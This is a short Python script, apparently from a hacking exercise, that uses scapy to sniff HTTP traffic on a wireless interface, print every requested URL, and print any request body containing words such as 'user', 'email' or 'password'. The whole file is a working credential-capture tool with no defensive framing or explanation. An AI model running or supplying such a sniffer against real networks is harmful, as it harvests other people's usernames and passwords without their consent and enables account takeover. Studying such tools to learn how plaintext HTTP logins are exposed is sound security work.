#!/usr/bin/python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        return url

def get_login_info(packet):
    interesting_fields = ["email", "username", "user", "pass", "password", "uname"]
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            load2 = str(load)
            for name in interesting_fields:
                if name in load2:
                    print(load2)
                    break

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request sent to >> " + str(url))
        login_info = get_login_info(packet)



sniff("wlx1cbfce1ab809")
